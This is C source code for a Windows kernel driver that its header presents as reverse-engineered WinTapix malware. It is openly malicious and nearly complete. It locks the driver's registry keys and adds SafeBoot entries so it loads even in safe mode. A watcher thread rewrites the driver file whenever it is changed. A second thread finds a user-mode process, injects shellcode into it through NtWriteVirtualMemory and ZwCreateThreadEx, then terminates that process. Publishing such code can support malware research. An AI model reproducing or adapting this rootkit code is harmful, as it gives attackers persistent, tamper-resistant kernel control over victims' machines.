/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#include "DriverMain.h"

__int64 query_file_information_get_file_size(
    
    const WCHAR* wchFileName

) {
    
    UNICODE_STRING uniStrStore;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    FILE_STANDARD_INFORMATION FileInformation;
    HANDLE hFile;

    RtlInitUnicodeString(
        
        &uniStrStore, 
        wchFileName
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 576;
    ObjectAttributes.ObjectName = &uniStrStore;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;

    __int64 sizeFile = 0xFFFFFFFFFFFFFFFF;

    if ( NT_SUCCESS( ZwCreateFile(
        
        &hFile, 
        0x80000000, 
        &ObjectAttributes, 
        &IoStatusBlock, 
        0i64, 
        0x80u, 
        1u,
        1u,
        0x20u,
        0i64,
        0
    
    ) ) ) {

        memset(
            
            &IoStatusBlock, 
            0, 
            sizeof( IoStatusBlock )
        
        );
        
        if ( NT_SUCCESS( ZwQueryInformationFile( 
            
            hFile, 
            &IoStatusBlock, 
            &FileInformation, 
            0x18u,
            FileStandardInformation
        
        ) ) )
            sizeFile = FileInformation.EndOfFile.QuadPart;
        
        ZwClose(
            
            hFile
        
        );
    }

    return sizeFile;
}

NTSTATUS wrap_read_file(
    
    const WCHAR* wchFileName,
    PVOID* pBuffer,
    SIZE_T* szBuffer

) {

    UNICODE_STRING uniStrDestination;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER ByteOffset;

    HANDLE hFile;

    *szBuffer = query_file_information_get_file_size(
        
        wchFileName
    
    );

    if ( *szBuffer == 0xFFFFFFFFFFFFFFFF )
        return STATUS_FILE_INVALID;

    *pBuffer = ExAllocatePoolWithTag( 
        
        NonPagedPool,
        *szBuffer,
        'MAL'
    
    );

    if ( !*pBuffer )
        return STATUS_ADDRESS_NOT_ASSOCIATED;

    RtlInitUnicodeString(
        
        &uniStrDestination,
        wchFileName
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 576;
    ObjectAttributes.ObjectName = &uniStrDestination;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;

    NTSTATUS status = ZwCreateFile(
        
        &hFile,
        0x80000000,
        &ObjectAttributes,
        &IoStatusBlock,
        0i64,
        0x80u,
        1u,
        1u,
        0x20u,
        0i64,
        0
    
    );

    if ( NT_SUCCESS( status ) ) {
        
        ByteOffset.QuadPart = 0i64;

        return ZwReadFile(
            
            hFile,
            0i64,
            0i64,
            0i64,
            &IoStatusBlock,
            *pBuffer,
            (ULONG)*szBuffer,
            &ByteOffset,
            0i64
        
        );
    }

    return status;
}

NTSTATUS create_kernel_mode_file(
    
    const WCHAR* wchWintapixPath

) {

    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    UNICODE_STRING uniStrPath;
    HANDLE hFile;

    memset(
        
        &IoStatusBlock,
        0,
        sizeof( IoStatusBlock )
    
    );

    RtlInitUnicodeString(
        
        &uniStrPath,
        wchWintapixPath
    
    );
    
    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 576;
    ObjectAttributes.ObjectName = &uniStrPath;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;

    return ZwCreateFile(
        
        &hFile,
        0x10000000u,
        &ObjectAttributes,
        &IoStatusBlock,
        0i64,
        0x80u,
        0,
        1u,
        0x20u,
        0i64,
        0
    
    );
}

NTSTATUS wrap_persistence_thread_main(
    
    const WCHAR* wchWintapixPath,
    const WCHAR* wchWintapixPath2,
    const WCHAR* wchWintapixName

) {

    PVOID pBuffer;
    SIZE_T szBuffer;
    UNICODE_STRING uniStrWintaPixPath;
    OBJECT_ATTRIBUTES ObjectAttributes;
    HANDLE hFile, hEvent;
    IO_STATUS_BLOCK IoStatusBlock;

    NtNotifyChangeDirectoryFile = ( _NtNotifyChangeDirectoryFile ) GetFunctionAddress(
        
        "NtNotifyChangeDirectoryFile"
    
    );

    if ( !MmIsAddressValid( 
        
        &NtNotifyChangeDirectoryFile
    
    ) )
        return STATUS_ADDRESS_NOT_ASSOCIATED;

    NTSTATUS status = wrap_read_file(
        
        wchWintapixPath,
        &pBuffer,
        &szBuffer
    
    );

    if ( NT_SUCCESS( status ) ) {

        create_kernel_mode_file(
            
            wchWintapixPath
        
        );

        RtlInitUnicodeString(
            
            &uniStrWintaPixPath,
            wchWintapixPath2
        
        );

        ObjectAttributes.Length = 48;
        ObjectAttributes.RootDirectory = 0i64;
        ObjectAttributes.Attributes = 64;
        ObjectAttributes.ObjectName = &uniStrWintaPixPath;
        ObjectAttributes.SecurityDescriptor = 0i64;
        ObjectAttributes.SecurityQualityOfService = 0i64;

        status = ZwCreateFile(
            
            &hFile, 
            0x100001u, 
            &ObjectAttributes, 
            &IoStatusBlock, 
            0i64, 
            0x4000u, 
            7u, 
            1u, 
            0x21u, 
            0i64, 
            0
        
        );

        if ( NT_SUCCESS( status ) ) {

            ObjectAttributes.Length = 48;
            
            memset(
                
                &ObjectAttributes.RootDirectory,
                0,
                20
            
            );
            
            ObjectAttributes.SecurityDescriptor = 0i64;
            ObjectAttributes.SecurityQualityOfService = 0i64;

            ZwCreateEvent(
                
                &hEvent, 
                0x1F0003u, 
                &ObjectAttributes, 
                NotificationEvent, 
                0
            
            );

            ULONG NumberOfBytes = 0x10000i64;

            FILE_NOTIFY_INFORMATION* fInfo = ( FILE_NOTIFY_INFORMATION* ) ExAllocatePoolWithTag( 
                
                NonPagedPool,
                0x10000ui64,
                'mall'
            
            );

            while ( TRUE ) {

                if ( NtNotifyChangeDirectoryFile( 
                    
                    hFile, 
                    hEvent, 
                    NULL, 
                    NULL, 
                    &IoStatusBlock, 
                    fInfo, 
                    NumberOfBytes, 
                    4095, 
                    TRUE 
                
                ) == STATUS_PENDING )
                    ZwWaitForSingleObject(
                        
                        hEvent,
                        1u,
                        0i64
                    
                    );
                
                ZwSetEvent(
                    
                    hEvent,
                    0i64
                
                );

                do {

                    DbgPrintEx(
                        
                        0,
                        0,
                        "File changed: %ls",
                        fInfo->FileName
                    
                    );

                    if ( compare_unicode_string_2(
                        
                        wchWintapixName, 
                        fInfo->FileName, 
                        fInfo->FileNameLength
                    
                    ) ) {

                        delete_file(
                            
                            wchWintapixPath
                        
                        );

                        override_file_with_buffer(
                            
                            wchWintapixPath,
                            pBuffer,
                            (ULONG)szBuffer
                        
                        );
                        
                        create_kernel_mode_file(
                            
                            wchWintapixPath
                        
                        );

                    }

                    fInfo = ( FILE_NOTIFY_INFORMATION* )( ( char* ) fInfo + fInfo->NextEntryOffset );

                } while ( fInfo->NextEntryOffset );

            }

        }

    }

    return status;
}

void persistence_thread(
    
    PVOID StartContext

) {

    UNREFERENCED_PARAMETER( StartContext );

    wrap_persistence_thread_main(
        
        L"\\systemroot\\system32\\drivers\\WinTapix.sys",
        L"\\systemroot\\system32\\drivers\\",
        L"WinTapix.sys"
    
    );

}

NTSTATUS notify_registry_key_change(
    
    const WCHAR* wchWintapixRegisty

) {

    UNICODE_STRING uniStrDest;
    OBJECT_ATTRIBUTES ObjectAttributes;

    RtlInitUnicodeString(
        
        &uniStrDest,
        wchWintapixRegisty
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 64;
    ObjectAttributes.ObjectName = &uniStrDest;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;
    
    HANDLE hKey;
    NTSTATUS status = ZwOpenKey(
        
        &hKey,
        0xF003Fu,
        &ObjectAttributes
    
    );
    
    if ( !NT_SUCCESS( status ) ) {

        ObjectAttributes.Length = 48;
        ObjectAttributes.RootDirectory = 0i64;
        ObjectAttributes.Attributes = 576;
        ObjectAttributes.ObjectName = &uniStrDest;
        ObjectAttributes.SecurityDescriptor = 0i64;
        ObjectAttributes.SecurityQualityOfService = 0i64;
        
        status = ZwCreateKey(
            
            &hKey,
            0xF003Fu,
            &ObjectAttributes,
            0,
            0i64,
            0,
            0i64
        
        );
    }

    if ( NT_SUCCESS( status ) ) return ZwNotifyChangeKey(
        
        hKey,
        0i64,
        NULL,
        (PVOID)1,
        &g_IoStatusBlock,
        5u,
        1u,
        0i64,
        0,
        1u
    
    );

    return status;
}

NTSTATUS Lock_Registy_Key(
    
    const WCHAR* wchRegistyKey

) {

    UNICODE_STRING uStrRegistyService;
    OBJECT_ATTRIBUTES ObjectAttributes;

    HANDLE hKey;

    NtLockRegistryKey = ( _NtLockRegistryKey )GetFunctionAddress(
        
        "NtLockRegistryKey"
    
    );

    if ( !MmIsAddressValid(
        
        &NtLockRegistryKey
    
    ) )
        return STATUS_ADDRESS_NOT_ASSOCIATED;

    RtlInitUnicodeString(
        
        &uStrRegistyService, 
        wchRegistyKey
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 64;
    ObjectAttributes.ObjectName = &uStrRegistyService;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;

    NTSTATUS status = ZwOpenKey(
        
        &hKey,
        0x20019u,
        &ObjectAttributes
    
    );

    if ( NT_SUCCESS( status ) )
        return NtLockRegistryKey(
            
            hKey
        
        );
    
    return STATUS_UNSUCCESSFUL;
}

NTSTATUS set_registry_key_value_2(
    
    void* handle, 
    const WCHAR* key, 
    int value

) {

    UNICODE_STRING uniStrValue;

    RtlInitUnicodeString(
        
        &uniStrValue, 
        key
    
    );

    return ZwSetValueKey(
        
        handle, 
        &uniStrValue, 
        0, 
        4, 
        (PVOID)value, 
        4
    
    );
}

NTSTATUS set_registry_key_value(
    
    void* handle,
    const WCHAR* key,
    void* value

) {

    UNICODE_STRING uniStrKey;
    size_t szLength;

    RtlStringCchLengthW(
        
        value,
        0x7FFFFFFF,
        &szLength
    
    );

    RtlInitUnicodeString(
        
        &uniStrKey,
        key
    
    );

    ULONG szValue = ( ULONG )szLength;

    return ZwSetValueKey(
        
        handle,
        &uniStrKey,
        0,
        1,
        value,
        2 * szValue + 2
    
    );
}

NTSTATUS garant_driver_run(
    
    const WCHAR* wchRegistyKey

) {

    UNICODE_STRING uniStrRegistyKey;
    OBJECT_ATTRIBUTES ObjectAttributes;
    HANDLE hKey;

    RtlInitUnicodeString(
        
        &uniStrRegistyKey,
        wchRegistyKey
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 64;
    ObjectAttributes.ObjectName = &uniStrRegistyKey;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;
    
    NTSTATUS status = ZwOpenKey(
        
        &hKey,
        0xF003Fu,
        &ObjectAttributes
    
    );

    if ( !NT_SUCCESS( status ) ) {

        //Create a new registy key
        ObjectAttributes.Length = 48;
        ObjectAttributes.RootDirectory = 0i64;
        ObjectAttributes.Attributes = 576;
        ObjectAttributes.ObjectName = &uniStrRegistyKey;
        ObjectAttributes.SecurityDescriptor = 0i64;
        ObjectAttributes.SecurityQualityOfService = 0i64;
        
        status = ZwCreateKey(
            
            &hKey,
            0xF003Fu,
            &ObjectAttributes,
            0,
            0i64,
            0,
            0i64
        
        );
    }

    if ( NT_SUCCESS( status ) ) {

        set_registry_key_value(
            
            hKey,
            L"DisplayName",
            L"WinTapix Driver"
        
        );

        set_registry_key_value_2(
            
            hKey,
            L"ErrorControl",
            TRUE
        
        );
        
        set_registry_key_value(
            
            hKey,
            L"ImagePath",
            L"\\SystemRoot\\System32\\drivers\\WinTapix.sys"
        
        );
        
        set_registry_key_value(
            
            hKey,
            L"Description",
            L"Windows Kernel Executive Module."
        
        );
        
        set_registry_key_value_2(
            
            hKey,
            L"Start",
            TRUE
        
        );
        
        set_registry_key_value_2(
            
            hKey,
            L"Type",
            TRUE
        
        );

        return ZwNotifyChangeKey(
            
            hKey,
            0i64, 
            NULL, 
            (PVOID)1, 
            &g_IoStatusBlock, 
            5u, 
            1u, 
            0i64, 
            0, 
            1u
        
        );

    }

    return STATUS_UNSUCCESSFUL;
}

NTSTATUS persistence_stuff_main( 
    
    void

) {

    UNICODE_STRING ustrWintapix;
    UNICODE_STRING ustrSecurityService;
    UNICODE_STRING ustrDriverMinimal;
    UNICODE_STRING ustrWintapixNetworkPersist;

    RtlInitUnicodeString(
        
        &ustrWintapix,
        L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinTapix"
    
    );

    NTSTATUS status = Lock_Registy_Key(
        
        ustrWintapix.Buffer
    
    );

    if ( NT_SUCCESS( status ) ) {

        garant_driver_run(
            
            ustrWintapix.Buffer
        
        );

        status = PsCreateSystemThread(
            
            &g_hThreadPersist,
            0,
            0i64,
            0i64,
            0i64,
            (PKSTART_ROUTINE)persistence_thread,
            0i64
        
        );

        if ( NT_SUCCESS( status ) ) {

            RtlInitUnicodeString(
                
                &ustrSecurityService,
                L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinTapix\\Security"
            
            );

            Lock_Registy_Key(
                
                ustrSecurityService.Buffer
            
            );

            RtlInitUnicodeString(
                
                &ustrDriverMinimal, 
                L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinTapix.sys"
            
            );

            notify_registry_key_change(
                
                ustrDriverMinimal.Buffer
            
            );

            Lock_Registy_Key(
                
                ustrDriverMinimal.Buffer
            
            );

            RtlInitUnicodeString(
                
                &ustrWintapixNetworkPersist,
                L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\WinTapix.sys"
            
            );

            notify_registry_key_change(
                
                ustrWintapixNetworkPersist.Buffer
            
            );

            Lock_Registy_Key(
                
                ustrWintapixNetworkPersist.Buffer
            
            );

        }

    }

    return status;
}


NTSTATUS SetThreadDelay(
    
    signed int siDelayTime

) {

    LARGE_INTEGER laInterval = { 0 };

    NTSTATUS ntStatus = STATUS_SUCCESS;

    if ( siDelayTime >= 50000 ) {

        laInterval.QuadPart = -10 * siDelayTime;

        return KeDelayExecutionThread(
            
            KernelMode,
            TRUE,
            &laInterval
        
        ) != 0;

    } else KeStallExecutionProcessor(
        
        siDelayTime
    
    );

    return ntStatus;
}

void ThreadMalware(
    
    PVOID StartContext

) {

    UNREFERENCED_PARAMETER( StartContext );

    SIZE_T process_to_inect = (SIZE_T)-1;

    while ( TRUE ) {

        while ( TRUE ) {

            OpenTargetProcess(
                
                &process_to_inect
            
            );

            DbgPrintEx(
                
                0, 
                0, 
                "PID: %X", 
                process_to_inect
            
            );

            if ( process_to_inect != -1 ) break;

            SetThreadDelay( 
            
                5000000
            
            );

        }

        if ( NT_SUCCESS( InjectShellcodeOnUsermodeProcess( 
            
            process_to_inect,
            GetFunctionAddress( 
            
                "NtWriteVirtualMemory"
            
            ),
            GetFunctionAddress( 
                
                "ZwCreateThreadEx"
            
            ),
            g_ucMyShellcode,
            3072
        
        ) ) )
            if ( NT_SUCCESS( TerminateUsemodeProcess( 
                
                process_to_inect
            
            ) ) )
                break;

    }

}

NTSTATUS DriverEntry(
    
    PDRIVER_OBJECT pDriverObject, 
    PUNICODE_STRING pRegistryPath

) {

    pDriverObject->DriverUnload = UnloadDriver;

    UNREFERENCED_PARAMETER( pDriverObject );

    UNREFERENCED_PARAMETER( pRegistryPath );

    DbgPrintEx(
        
        0,
        0,
        "Hello World !!"
    
    );

    persistence_stuff_main( );

    PsCreateSystemThread( 
        
        &g_hThread,
        0,
        NULL,
        NULL,
        NULL,
        &ThreadMalware,
        NULL
    
    );

    return STATUS_SUCCESS;
}

VOID UnloadDriver(
    
    PDRIVER_OBJECT pDriverObject

) {

    DbgPrintEx(

        0, 
        0, 
        "GoodBye, Driver Unload !!"
    
    );

    UNREFERENCED_PARAMETER( pDriverObject );

    ZwClose(
        
        g_hThread
    
    );

    ZwClose(
        
        g_hThreadPersist
    
    );

}